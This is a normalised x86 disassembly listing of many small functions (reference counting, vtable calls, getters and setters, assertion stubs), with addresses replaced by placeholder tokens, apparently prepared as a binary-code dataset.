call sub_41761f
pop esi
pop ebp
retn 0x8
sub_415f51
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_415f66
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_415fc7
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_415fdc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_415fed
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41766c
pop esi
pop ebp
retn 0x8
sub_416009
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41601e
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416054
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407804
mov esi [ ebp + 0x8 ]
mov ecx eax
call sub_419188
pop esi
pop ebp
retn 0x4
sub_41606f
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_416084
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_416095
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ecx
call sub_4176b8
pop ebp
retn 0x8
sub_4160ae
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4160c3
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41611f
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_416156
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417715
pop ebp
retn 0x8
sub_41616e
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416183
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4161df
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4161f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_416205
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417770
pop ebp
retn 0x8
sub_41621d
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416232
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416291
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4162a6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_4162b7
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_4177cb
pop ebp
retn 0x8
sub_4162cf
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4162e4
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416343
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_416358
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_416369
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417826
pop ebp
retn 0x8
sub_416381
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416396
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4163f5
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41640a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41641b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417881
pop ebp
retn 0x8
sub_416433
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416448
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4164a7
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4164bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_4164cd
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_4178dc
pop ebp
retn 0x8
sub_4164e5
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4164fa
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41650b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_417e43
mov al [ ebp + 0x8 ]
pop ecx
pop ebp
retn 0x4
sub_41658b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41659c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417948
pop ebp
retn 0x8
sub_4165b4
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4165c9
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416647
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_416658
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417978
pop ebp
retn 0x8
sub_416670
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416685
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4166e3
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_416717
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4179a8
pop esi
pop ebp
retn 0x8
sub_416733
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416748
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4167a5
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4167d9
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4179f5
pop esi
pop ebp
retn 0x8
sub_4167f5
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41680a
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416867
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41689c
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417a42
pop esi
pop ebp
retn 0x8
sub_4168b8
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4168cd
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416936
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x14 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41694b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41695c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417a8e
pop ebp
retn 0x8
sub_416974
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416989
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416a1b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_416a2c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417abe
pop ebp
retn 0x8
sub_416a44
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416a59
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416aeb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_416afc
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417b19
pop ebp
retn 0x8
sub_416b14
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416b29
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416bd8
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_417b74
pop ebp
retn 0x8
sub_416bf0
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_416c05
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_416c16
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_416c24
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_416c32
push ebx
mov ebx ecx
call sub_416f3f
mov eax ebx
pop ebx
retn
sub_416c3e
push ebx
mov ebx ecx
call sub_416f3f
mov eax ebx
pop ebx
retn
sub_416e6a
mov ecx edi
mov eax esi
call sub_40fda8
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax esi
retn
sub_417434
mov esi [ ebp + 0x8 ]
call sub_41472b
push 0x0
push 0x0
call sub_426f77
int3
sub_417494
retn 0x4
sub_417558
retn 0x4
sub_41761c
retn 0x4
sub_417669
retn 0x4
sub_4176b5
retn 0x4
sub_4176fa
push ebp
mov ebp esp
push esi
lea esi [ eax + 0xc ]
call sub_407e47
push [ ebp + 0xc ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc ]
pop esi
pop ebp
retn 0x8
sub_41776d
retn 0x4
sub_4177c8
retn 0x4
sub_417823
retn 0x4
sub_41787e
retn 0x4
sub_4178d9
retn 0x4
sub_417934
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_417e43
mov al [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_417945
retn 0x4
sub_417975
retn 0x4
sub_4179a5
retn 0x4
sub_4179f2
retn 0x4
sub_417a3f
retn 0x4
sub_417a8b
retn 0x4
sub_417abb
retn 0x4
sub_417b16
retn 0x4
sub_417b71
retn 0x4
sub_417ba1
push 0x0
push 0x1
call sub_40487c
retn
sub_417bab
push 0x0
push 0x1
call sub_40487c
retn
sub_417bb5
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_417bbf
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_417bc4
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_417bca
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x1
retn
sub_417c0e
cmp eax [ ecx + 0x4 ]
jae r-xdata
xor eax eax
retn
cmp [ ecx ] eax
ja r-xdata
xor eax eax
inc eax
retn
sub_417c55
retn
sub_417e43
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_418094
pop ecx
test eax eax
je r-xdata
pop ebp
retn
pop ebp
jmp sub_4039da
sub_417e5b
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn
sub_417f82
mov cl [ ecx ]
mov [ eax ] cl
retn
sub_417f87
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_417f8c
retn
sub_417f8d
mov cl [ ecx ]
mov [ eax ] cl
retn
sub_417f92
mov cl [ ecx ]
mov [ eax ] cl
retn
sub_417f97
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_418021
push [ ebp - 0x14 ]
call sub_424fc7
pop ecx
push 0x0
push 0x0
call sub_426f77
int3
sub_41806d
push r--data
call sub_446a95
sub_418082
push ebp
mov ebp esp
pop ebp
jmp sub_418094
sub_41808b
mov [ eax ] ecx
retn
sub_41808e
mov eax 0x7fffffff
retn
sub_4180b5
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
setl al
pop ebp
retn
sub_4180c2
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0xff
jle r-xdata
xor eax eax
pop ebp
retn
push 0x2
pop eax
pop ebp
retn
sub_4180d7
or al 0xff
retn
sub_418321
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_418336
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_418d9b
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_418da9
call sub_419df2
xor ecx ecx
test al al
sete al
retn
sub_418db6
movzx ecx cl
jmp sub_419dc1
sub_418efc
mov [ eax ] ecx
retn
sub_418eff
push ebp
mov ebp esp
push [ eax + 0x4 ]
push [ eax + 0x8 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
call sub_41b711
pop ebp
retn 0x4
sub_418f3d
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ eax ] ecx
retn
mov ecx [ ecx ]
sub_418f48
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov ecx [ ecx + 0x10 ]
add ecx edx
mov [ eax ] ecx
retn
sub_418f5c
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_418f65
retn
sub_418f66
push ebp
mov ebp esp
mov ecx [ eax + 0x204 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx ecx al
call sub_419dc1
pop ebp
retn 0x4
sub_41901b
retn
sub_4190b2
retn
sub_419127
retn
sub_419128
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_419176
retn
sub_419177
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_4191aa
retn
sub_4191ab
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41920e
retn
sub_41920f
push ebp
mov ebp esp
mov [ eax + 0x11 ] 0x1
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_419275
retn
sub_419276
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_419309
retn
sub_41930a
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41939d
retn
sub_41939e
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_419431
retn
sub_419432
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_4194c5
retn
sub_4194c6
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41957e
mov [ eax + 0x20 ] 0x1
retn
sub_419583
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_419605
mov [ eax + 0x20 ] 0x1
retn
sub_41960a
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_419663
retn
sub_4196b0
retn
sub_419716
retn
sub_4197b5
retn
sub_4197b6
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_4197fc
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41980c
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41984d
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41985d
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_4198a0
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4198b0
push ebp
mov ebp esp
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc ]
mov eax [ ebp + 0xc ]
pop ebp
retn 0x8
sub_4198c9
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fced
add esp 0xc
pop ebp
retn 0x8
sub_4198e1
retn
sub_4198e2
test eax eax
je r-xdata
retn
mov cx [ ecx ]
mov [ eax ] cx
sub_4198ed
test eax eax
je r-xdata
retn
mov cx [ ecx ]
mov [ eax ] cx
sub_419d3a
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_419d44
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c4e6
pop ecx
pop ecx
pop ebp
retn 0x8
sub_419d99
push 0x0
push 0x1
call sub_40487c
retn
sub_419da3
push 0x0
push 0x1
call sub_40487c
retn
sub_419dad
push 0x0
push 0x1
call sub_40487c
retn
sub_419db7
push 0x0
push 0x1
call sub_40487c
retn
sub_419df2
push 0x3
pop eax
mov al 0x1
retn
dec eax
jns r-xdata
mov edx [ ecx + eax * 8 ]
or edx [ ecx + eax * 8 + 0x4 ]
jne r-xdata
xor al al
retn
sub_419e07
mov [ eax ] 0x1
retn
sub_419e0e
mov [ eax ] 0x3ffffffe
retn
sub_419e15
mov [ eax ] ecx
retn
sub_419e18
call sub_420542
mov [ edi ] eax
mov eax edi
retn
sub_419e22
call sub_420542
mov [ edi ] eax
mov eax edi
retn
sub_419e68
mov eax [ eax ]
retn
sub_419e6b
mov eax [ eax ]
retn
sub_419e6e
push ebp
mov ebp esp
movzx eax al
mov ax [ ecx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
and ax [ ecx ]
xor ecx ecx
xor edx edx
cmp cx ax
setne al
pop ebp
retn 0x4
sub_419e8c
push ebp
mov ebp esp
movzx eax al
mov ax [ ecx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
and ax [ ecx ]
xor ecx ecx
xor edx edx
cmp cx ax
setne al
pop ebp
retn 0x4
sub_419eaa
push ebp
mov ebp esp
movzx eax al
mov ax [ ecx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
and ax [ ecx ]
xor ecx ecx
xor edx edx
cmp cx ax
setne al
pop ebp
retn 0x4
sub_419ec8
push ebp
mov ebp esp
movzx eax al
mov ax [ ecx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
and ax [ ecx ]
xor ecx ecx
xor edx edx
cmp cx ax
setne al
pop ebp
retn 0x4
sub_419ee6
mov eax [ eax ]
lea eax [ eax + ecx * 2 ]
retn
sub_419eec
test eax eax
je r-xdata
retn
mov cx [ ecx ]
mov [ eax ] cx
sub_419ef7
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_419f16
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_419f35
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_419f54
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_419f73
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_419f92
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_419fb1
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_419fd0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_419fef
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a00e
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a02d
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a04c
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a06b
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a08a
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a0a9
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a0c8
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a0e7
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a106
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a125
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a144
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41a188
push ebp
mov ebp esp
push esi
push edi
lea esi [ ecx + 0x8 ]
call sub_407804
mov edi [ ebp + 0x8 ]
call sub_41c52c
pop edi
pop esi
pop ebp
retn 0x4
sub_41a1a3
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41a1b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41a1c9
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41af1f
pop ebp
retn 0x8
sub_41a1e1
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41a1f6
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41a25e
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x28 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41a291
push ebp
mov ebp esp
push [ ebp + 0xc ]
mov eax ecx
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41af7a
pop ebp
retn 0x8
sub_41a2ab
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41a2c0
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41a328
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x28 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41a35b
push ebp
mov ebp esp
push [ ebp + 0xc ]
mov eax ecx
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41afdb
pop ebp
retn 0x8
sub_41a375
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41a38a
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41a3ee
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x40 ]
call sub_407e47
mov edx [ eax ]
